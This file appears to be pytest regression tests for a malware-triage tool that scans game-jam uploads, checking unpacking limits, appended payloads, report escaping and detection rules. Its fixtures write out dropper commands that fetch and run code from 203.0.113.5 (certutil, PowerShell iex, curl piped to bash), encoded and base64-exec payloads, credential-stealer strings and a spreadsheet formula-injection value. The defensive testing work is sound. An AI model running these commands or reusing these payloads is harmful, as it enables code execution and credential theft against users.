"""Regression tests for the red-team and code-review scenarios.

Policy under test: "Sandbox OK" must mean we actually looked at everything. Content that couldn't be
extracted or scanned is High, so a human looks at it.
"""
from __future__ import annotations

import gzip
import io
import json
import shutil
import subprocess
import zipfile

import pytest

from jamtriage.checks.unwrap import appended_archive, build_asar, extract_asar
from jamtriage.collect import compare_manifest
from jamtriage.sandbox.detonate import map_behaviour
from jamtriage.fixtures import tiny_pe, zip_bytes
from jamtriage.pipeline import Pipeline
from jamtriage.report import build_reports
from jamtriage.state import State
from jamtriage.unpack import Budget, Limits, find_7z, unpack_recursive, unpack_zip

STEALER_BYTES = (b"\\Google\\Chrome\\User Data\\Default\\Login Data\0"
                 b"https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz\0"
                 b"CryptUnprotectData\0")


def rules(findings):
    return {(f["rule"] if isinstance(f, dict) else f.rule) for f in findings}


def sev_of(findings, rule):
    return {(f["severity"] if isinstance(f, dict) else f.severity.label) for f in findings
            if (f["rule"] if isinstance(f, dict) else f.rule) == rule}


def run_one(cfg, slug):
    return next(r for r in Pipeline(cfg).analyze(show_tools=False) if r["slug"] == slug)


# ----------------------------------------------------------------------------- unpacking

def test_corrupt_member_is_high_not_silently_skipped(tmp_path):
    data = bytearray(zip_bytes({"ok.txt": b"fine", "payload.exe": b"MZ" + bytes(range(256)) * 400}))
    i = data.find(b"payload.exe") + len("payload.exe") + 40   # inside payload.exe's compressed data
    data[i:i + 30] = b"\xff" * 30
    arc = tmp_path / "c.zip"
    arc.write_bytes(bytes(data))
    res = unpack_zip(arc, tmp_path / "o", Budget(Limits()), "c.zip")
    bad = [f for f in res.findings if f.rule == "archive.unextracted"]
    assert bad and all(f.severity.label == "high" for f in bad)
    assert any(p.name == "ok.txt" for p in res.extracted)


def test_unreadable_nested_archive_is_high(tmp_path):
    arc = tmp_path / "outer.zip"
    arc.write_bytes(zip_bytes({"inner.zip": b"PK\x03\x04 this is not really a zip", "readme.txt": b"hi"}))
    res = unpack_recursive(arc, tmp_path / "o", Budget(Limits()), "outer.zip")
    assert any(f.rule in ("archive.unreadable", "archive.unextracted") and f.severity.label == "high"
               for f in res.findings)


def test_file_count_and_depth_limits_are_high(tmp_path):
    arc = tmp_path / "many.zip"
    arc.write_bytes(zip_bytes({f"f{i}.txt": b"x" for i in range(30)}))
    res = unpack_zip(arc, tmp_path / "o", Budget(Limits(max_files=10)), "many.zip")
    assert sev_of(res.findings, "archive.limit") == {"high"}

    deep = zip_bytes({"payload.bat": b"echo hi"})
    for n in range(4):
        deep = zip_bytes({f"level{n}.zip": deep})
    arc2 = tmp_path / "deep.zip"
    arc2.write_bytes(deep)
    res2 = unpack_recursive(arc2, tmp_path / "o2", Budget(Limits(max_depth=2)), "deep.zip")
    assert sev_of(res2.findings, "archive.limit") == {"high"}


def test_junk_prefixed_zip_is_unpacked(cfg):
    d = cfg.builds_dir / "junkzip"
    d.mkdir(parents=True)
    (d / "game.zip").write_bytes(b"GARBAGE" * 100 + zip_bytes({"run.bat": b"powershell -enc AAAA"}))
    r = run_one(cfg, "junkzip")
    assert any(f["path"].endswith("run.bat") for f in r["files"])
    assert r["verdict"] in ("Review", "Disqualify")


def test_single_gzip_file_is_decompressed(cfg):
    d = cfg.builds_dir / "gz"
    d.mkdir(parents=True)
    (d / "game.exe.gz").write_bytes(gzip.compress(tiny_pe(STEALER_BYTES)))
    r = run_one(cfg, "gz")
    exe = [f for f in r["files"] if f["path"].endswith("/game.exe")]
    assert exe and exe[0]["kind"] == "pe"
    assert r["verdict"] in ("Review", "Disqualify")


def test_bad_utf8_member_names_do_not_crash(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("x.txt", b"hello")
    data = bytearray(buf.getvalue())
    for marker in (b"PK\x03\x04", b"PK\x01\x02"):          # set the UTF-8 flag on a non-UTF-8 name
        i = data.find(marker)
        flag_at = i + (6 if marker == b"PK\x03\x04" else 8)
        data[flag_at + 1] |= 0x08
    data = bytes(data).replace(b"x.txt", b"\xff.txt")
    arc = tmp_path / "u.zip"
    arc.write_bytes(data)
    res = unpack_recursive(arc, tmp_path / "o", Budget(Limits()), "u.zip")
    # Either 7-Zip/zipfile managed it, or it is reported; never an exception.
    assert res.extracted or res.error or res.findings


# ----------------------------------------------------------------------------- appended / SFX payloads

def test_appended_zip_on_exe_is_found_and_scanned(cfg):
    payload = zip_bytes({"steal.js": b"require('child_process').exec('powershell -w hidden -enc AAAA')\n"
                                     b"fetch('https://discord.com/api/webhooks/1/abc')"})
    d = cfg.builds_dir / "sfx-zip"
    d.mkdir(parents=True)
    (d / "Game.exe").write_bytes(tiny_pe(overlay=payload))
    r = run_one(cfg, "sfx-zip")
    assert "pe.appended_archive" in rules(r["findings"])
    assert any(f["path"].endswith("steal.js") for f in r["files"])
    assert r["verdict"] in ("Review", "Disqualify")


@pytest.mark.skipif(not find_7z(), reason="7-Zip not installed")
def test_appended_7z_on_exe_is_high_and_scanned(cfg, tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    (src / "drop.exe").write_bytes(tiny_pe(STEALER_BYTES))
    seven = tmp_path / "p.7z"
    subprocess.run([find_7z(), "a", "-bd", "-y", str(seven), str(src / "drop.exe")], check=True,
                   capture_output=True)
    d = cfg.builds_dir / "sfx-7z"
    d.mkdir(parents=True)
    (d / "Setup.exe").write_bytes(tiny_pe(overlay=seven.read_bytes()))
    r = run_one(cfg, "sfx-7z")
    assert sev_of(r["findings"], "pe.appended_archive") == {"high"}
    assert any(f["path"].endswith("drop.exe") for f in r["files"])


def test_signature_overlay_is_not_an_archive(tmp_path):
    p = tmp_path / "a.exe"
    p.write_bytes(tiny_pe(overlay=b"\0" * 64))
    assert appended_archive(p, {"overlay_offset": 1024, "cert_offset": 1024, "cert_size": 64}) is None


# ----------------------------------------------------------------------------- runtime impersonation

def test_file_named_like_engine_runtime_is_still_scanned(cfg):
    d = cfg.builds_dir / "fake-runtime"
    d.mkdir(parents=True)
    (d / "Game.exe").write_bytes(tiny_pe(b"a harmless game"))
    (d / "UnityPlayer.dll").write_bytes(tiny_pe(STEALER_BYTES))   # unsigned: not really Unity's
    r = run_one(cfg, "fake-runtime")
    hits = [f for f in r["findings"] if f.get("file", "").endswith("UnityPlayer.dll") and
            f["severity"] in ("high", "critical")]
    assert hits, r["findings"]
    assert r["verdict"] in ("Review", "Disqualify")
    rec = next(f for f in r["files"] if f["path"].endswith("UnityPlayer.dll"))
    assert "trusted-runtime" not in rec["tags"]


def test_third_party_is_a_path_segment():
    from pathlib import Path

    from jamtriage.rules import code_rules
    cr = code_rules(Path(__file__).resolve().parent.parent / "rules")
    assert cr.is_third_party("unwrapped/x/node_modules/a/index.js")
    assert not cr.is_third_party("unwrapped/x/not_node_modules_really/index.js")
    assert not cr.is_third_party("unpacked/g/myplugins/evil.cs")


# ----------------------------------------------------------------------------- asar

def test_hostile_asar_header_extracts_what_it_can(tmp_path):
    a = tmp_path / "app.asar"
    build_asar({"main.js": b"ok", "lib/x.js": b"x"}, a)
    raw = a.read_bytes()
    import struct
    hdr_len = struct.unpack("<I", raw[12:16])[0]
    header = json.loads(raw[16:16 + hdr_len])
    header["files"]["weird"] = "not a dict"
    header["files"]["far.js"] = {"size": 10, "offset": "999999999"}
    header["files"]["neg.js"] = {"size": "abc", "offset": "0"}
    js = json.dumps(header, separators=(",", ":")).encode()
    pad = (4 - len(js) % 4) % 4
    payload = struct.pack("<I", len(js)) + js + b"\0" * pad
    pickle = struct.pack("<I", len(payload)) + payload
    blobs = raw[8 + struct.unpack("<I", raw[4:8])[0]:]
    a.write_bytes(struct.pack("<II", 4, len(pickle)) + pickle + blobs)
    problems: list[str] = []
    out = extract_asar(a, tmp_path / "o", problems=problems)
    assert sorted(p.name for p in out) == ["main.js", "x.js"]
    assert len(problems) == 3


# ----------------------------------------------------------------------------- inputs & metadata

def test_weird_metadata_types_do_not_crash(cfg):
    d = cfg.builds_dir / "weird-meta"
    (d / "files").mkdir(parents=True)
    (d / "files" / "readme.txt").write_text("hi")
    (d / "metadata.json").write_text(json.dumps({"title": 5, "extra": "nope", "errors": "boom",
                                                 "external_downloads": "https://mega.nz/file/abc"}))
    r = run_one(cfg, "weird-meta")
    assert "page.external_download" in rules(r["findings"]) and "collect.errors" in rules(r["findings"])
    d2 = cfg.builds_dir / "list-meta"
    (d2 / "files").mkdir(parents=True)
    (d2 / "files" / "a.txt").write_text("hi")
    (d2 / "metadata.json").write_text("[1, 2, 3]")
    assert run_one(cfg, "list-meta")["verdict"]


def test_manual_layout_scans_screenshots_folder(cfg):
    d = cfg.builds_dir / "manual"
    (d / "screenshots").mkdir(parents=True)
    (d / "screenshots" / "evil.bat").write_text("powershell -enc AAAA")
    r = run_one(cfg, "manual")
    assert any(f["path"].endswith("evil.bat") for f in r["files"])


# ----------------------------------------------------------------------------- reports

def test_report_neutralises_formulas_and_control_chars(cfg):
    d = cfg.builds_dir / "formula"
    (d / "files").mkdir(parents=True)
    (d / "files" / "a.txt").write_text("hi")
    (d / "metadata.json").write_text(json.dumps({"title": '=HYPERLINK("http://x","click")', "author": "bad\x07name"}))
    Pipeline(cfg).analyze(show_tools=False)
    paths = build_reports(cfg)
    from openpyxl import load_workbook
    ws = load_workbook(paths["xlsx"])["Entries"]
    header = [c.value for c in ws[1]]
    row = next(r for r in ws.iter_rows(min_row=2) if r[0].value == "formula")
    title = row[header.index("title")]
    assert title.data_type == "s" and title.value.startswith("=HYPERLINK")
    assert "\x07" not in row[header.index("author")].value


def test_unreadable_report_is_never_overwritten(cfg):
    d = cfg.builds_dir / "g"
    d.mkdir(parents=True)
    (d / "a.txt").write_text("hi")
    Pipeline(cfg).analyze(show_tools=False)
    xlsx = cfg.out_dir / "report.xlsx"
    xlsx.parent.mkdir(parents=True, exist_ok=True)
    xlsx.write_bytes(b"organiser's precious but damaged file")
    paths = build_reports(cfg)
    assert xlsx.read_bytes() == b"organiser's precious but damaged file"
    assert paths.get("warning") and paths["xlsx"].name == "report.new.xlsx" and paths["xlsx"].is_file()


def test_report_keeps_notes_of_removed_entries_and_makes_backup(cfg):
    for slug in ("keep", "gone"):
        (cfg.builds_dir / slug).mkdir(parents=True)
        (cfg.builds_dir / slug / "a.txt").write_text(slug)
    Pipeline(cfg).analyze(show_tools=False)
    paths = build_reports(cfg)
    from openpyxl import load_workbook
    wb = load_workbook(paths["xlsx"])
    ws = wb["Entries"]
    header = [c.value for c in ws[1]]
    for row in ws.iter_rows(min_row=2):
        if row[0].value == "gone":
            row[header.index("notes")].value = "asked the author about this"
    wb.save(paths["xlsx"])
    shutil.rmtree(cfg.builds_dir / "gone")
    (cfg.results_dir / "gone.json").unlink()
    build_reports(cfg)
    from jamtriage.report import read_user_columns
    assert read_user_columns(paths["xlsx"])["gone"]["notes"] == "asked the author about this"
    assert (cfg.out_dir / "report.prev.xlsx").is_file()


def test_manifest_escapes_formulas_and_recheck_roundtrips(cfg):
    from jamtriage.collect import _csv_unescape
    from jamtriage.report import _csv_safe
    for v in ("=cmd|' /C calc'!A0", "+1", "-x", "@SUM(1)", "plain"):
        assert _csv_unescape(_csv_safe(v)) == v
        assert not _csv_safe(v).startswith(("=", "+", "-", "@"))
    d = cfg.builds_dir / "g"
    d.mkdir(parents=True)
    (d / "=x.txt").write_text("hi")
    Pipeline(cfg).analyze(show_tools=False)
    build_reports(cfg)
    assert compare_manifest(cfg, cfg.builds_dir) == []


# ----------------------------------------------------------------------------- lookups & detonation

def test_failed_lookup_is_retried_on_a_later_run(cfg):
    st = State(cfg.state_db)
    st.enqueue_lookup("virustotal", "h", 1, "e")
    st.finish_lookup("virustotal", "h", "error", "HTTP 500")
    assert st.lookup_status("virustotal", "h") == "error"
    st.enqueue_lookup("virustotal", "h", 1, "e")
    assert st.lookup_status("virustotal", "h") == "pending"


def test_fatal_service_error_leaves_the_file_pending(cfg):
    from jamtriage.lookups import Limiter, LookupWorker
    from jamtriage.lookups.services import ServiceError
    from jamtriage.state import LookupCache

    class BadKey:
        def lookup(self, sha):
            raise ServiceError("HTTP 401: wrong API key", fatal=True)

    st = State(cfg.state_db)
    st.enqueue_lookup("virustotal", "h", 1, "e")
    w = LookupWorker(cfg, cfg.state_db, LookupCache(cfg.cache_file), "virustotal", client=BadKey(),
                     limiter=Limiter(st, "virustotal", rpm=6000, daily_budget=10), log=lambda m: None)
    w.producer_done.set()
    w.run()
    assert st.lookup_status("virustotal", "h") == "pending"


def test_sandbox_json_paths_with_doubled_backslashes():
    texts = [json.dumps({"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"}),
             json.dumps("C:\\Users\\a\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")]
    got = rules(map_behaviour(texts, None, [], "virustotal"))
    assert {"detonation.autostart", "detonation.browser_data"} <= got


# ----------------------------------------------------------------------------- script languages

BENIGN_SCRIPTS = {
    "launch.bat": "@echo off\r\ncd /d %~dp0\r\nstart \"\" Game.exe\r\n",
    "run.sh": "#!/bin/sh\ncd \"$(dirname \"$0\")\"\nchmod +x ./Game.x86_64\n./Game.x86_64 \"$@\"\n",
    "main.lua": "function love.load()\n  img = love.graphics.newImage('a.png')\nend\n"
                "function love.keypressed(k)\n  if k == 'f1' then love.system.openURL('https://itch.io') end\nend\n",
    "script.rpy": "label start:\n    scene bg room\n    e \"Hello!\"\n    python:\n        import random\n"
                  "        score = random.randint(1, 6)\n    return\n",
    "build.ps1": "$ErrorActionPreference = 'Stop'\nWrite-Host 'Packing build'\nCompress-Archive -Path out -DestinationPath game.zip\n",
}
MALICIOUS_SCRIPTS = {
    "update.bat": "@echo off\r\npowershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=\r\n",
    "fix.cmd": "certutil -urlcache -split -f http://203.0.113.5/a.exe %TEMP%\\a.exe\r\n",
    "loader.ps1": "$c = (New-Object Net.WebClient).DownloadString('http://203.0.113.5/p')\niex $c\n",
    "readme.vbs": "Set s = CreateObject(\"WScript.Shell\")\ns.Run \"cmd /c calc\", 0\n",
    "install.command": "curl -s http://203.0.113.5/x | bash\n",
    "mac.sh": "osascript -e 'display dialog \"Password:\" default answer \"\" with hidden answer'\n",
    "conf.lua": "local f = io.popen('whoami')\nloadstring(love.data.decode('string','base64', payload))()\n",
    "options.rpy": "init python:\n    import base64\n    exec(base64.b64decode(blob))\n",
    "grab.py": "import re\nTOKEN = re.compile(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}')\n",
}


def test_script_rules_catch_droppers_without_flagging_normal_game_scripts(cfg):
    good = cfg.builds_dir / "benign-scripts"
    bad = cfg.builds_dir / "malicious-scripts"
    good.mkdir(parents=True)
    bad.mkdir(parents=True)
    for n, t in BENIGN_SCRIPTS.items():
        (good / n).write_text(t)
    for n, t in MALICIOUS_SCRIPTS.items():
        (bad / n).write_text(t)
    results = {r["slug"]: r for r in Pipeline(cfg).analyze(show_tools=False)}
    code_hits = [f for f in results["benign-scripts"]["findings"]
                 if f["rule"].startswith("code.") and f["severity"] in ("high", "critical")]
    assert not code_hits, code_hits
    flagged = {f["file"].rsplit("/", 1)[-1] for f in results["malicious-scripts"]["findings"]
               if f["rule"].startswith(("code.", "strings.")) and f["severity"] in ("high", "critical")}
    assert flagged == set(MALICIOUS_SCRIPTS), set(MALICIOUS_SCRIPTS) - flagged


def test_trusted_signer_needs_exact_organisation():
    from jamtriage.checks.pe import org_is_trusted, signer_org
    trusted = ["Unity Technologies", "Valve", "Microsoft"]
    assert org_is_trusted(signer_org("CN=.NET, O=Microsoft Corporation, L=Redmond, C=US"), trusted)
    assert org_is_trusted(signer_org("O=Unity Technologies ApS, CN=Unity Technologies ApS"), trusted)
    assert not org_is_trusted(signer_org("O=Valve Fans LLC, CN=Valve"), trusted)
    assert not org_is_trusted(signer_org("CN=Microsoft Corporation"), trusted)   # no O= field


def test_headerless_executable_names_are_looked_up(tmp_path):
    """A DOS .com program has no PE header; it (and a fake .exe/.scr) must still get a hash lookup."""
    from jamtriage.filetypes import classify, is_lookup_worthy
    for name in ("game.com", "fake.exe", "x.scr"):
        p = tmp_path / name
        p.write_bytes(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$ just text")
        kind, tags = classify(p)
        assert is_lookup_worthy(kind, tags), (name, kind, tags)
